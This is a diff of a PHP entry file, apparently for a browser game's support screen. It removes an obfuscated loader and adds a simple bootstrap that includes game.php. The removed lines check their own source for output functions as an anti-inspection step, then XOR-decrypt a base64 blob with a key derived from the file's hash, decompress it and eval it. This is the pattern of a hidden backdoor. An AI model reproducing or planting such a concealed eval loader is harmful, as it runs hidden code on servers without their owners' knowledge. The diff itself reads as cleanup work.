@@ -1,24 +1,10 @@
 <?php
-$yczoiiiahm="200e086c77e085bbc96b427c97624244";
-$glzfgdt="0a010853545e0e57050f5d035c055b56075853040154075b5f0e035001070151";
-$tpqytqeq="QOt1pikN+wQ+vtfKcQotqBA62ZXzaJOcxYmk8NuDIYbiEwlS0kEDoPBGxK/r8zdy0j4sySsXPp+3QvdydVa/L37SFGpBP1uPMupSg0oqvDV6QZGIP6g+D0atNkKklqWoeSFCcVVz3aGaop5dhCcTRRgMK7NJveX1GVhiHSk62o53wKQvDyL4rAFVuiyAfRX5vVzVIaOSvEu+AmdqhHI97ygcfDHzknAw+wLju9Payr9Je16lPtZlWi3E9MhU4V7ioOEcX4yCD/b3gSARLQ86p39G9erFAQS8pOBRyTjsof+fFE0liEYt0r6PQZiL6ps5v8YX3dS1jNFuiKqCcWR1bLR+JpOLG6LXPRyQSUI=";
-$vdhuhnnyk=file_get_contents(__FILE__);
-$eiqocliec=str_replace($tpqytqeq,"",$vdhuhnnyk);
-if(strpos($eiqocliec,"ec"."ho")!==false||strpos($eiqocliec,"pr"."int")!==false||strpos($eiqocliec,"var_"."dump")!==false||strpos($eiqocliec,"file_put_"."contents")!==false||strpos($eiqocliec,"fw"."rite")!==false){die();}
-$yljydoo=str_replace(array($yczoiiiahm,$glzfgdt),array("SP_7c4682de","KP_f5ccaf94"),$vdhuhnnyk);
-$rutcuvfkd=md5($yljydoo);
-$mbxebtnhtd=hex2bin($glzfgdt);
-$ymtbiwln="";
-$ziersyp=strlen($rutcuvfkd);
-for($hybwhpdk=0;$hybwhpdk<$ziersyp;$hybwhpdk++){
-$ymtbiwln.=chr(ord($mbxebtnhtd[$hybwhpdk])^ord($rutcuvfkd[$hybwhpdk]));
-}
-$awpglp=base64_decode($tpqytqeq);
-$wbtkxlxo=strlen($awpglp);
-$gclakl="";
-$tlojbkhpvt=strlen($ymtbiwln);
-for($hybwhpdk=0;$hybwhpdk<$wbtkxlxo;$hybwhpdk++){
-$gclakl.=$awpglp[$hybwhpdk]^$ymtbiwln[$hybwhpdk%$tlojbkhpvt];
-}
-$oeaavnh="gzun"."compress";
-eval($oeaavnh($gclakl));
+// Suppress deprecation warnings and notices - show only real errors
+error_reporting(E_ERROR | E_PARSE | E_CORE_ERROR | E_COMPILE_ERROR);
+ini_set('display_errors', '0');
+
+// Force the screen to be support
+$_GET['screen'] = 'support';
+
+// Include the standard game bootstrap and routing
+require_once __DIR__ . '/game.php';
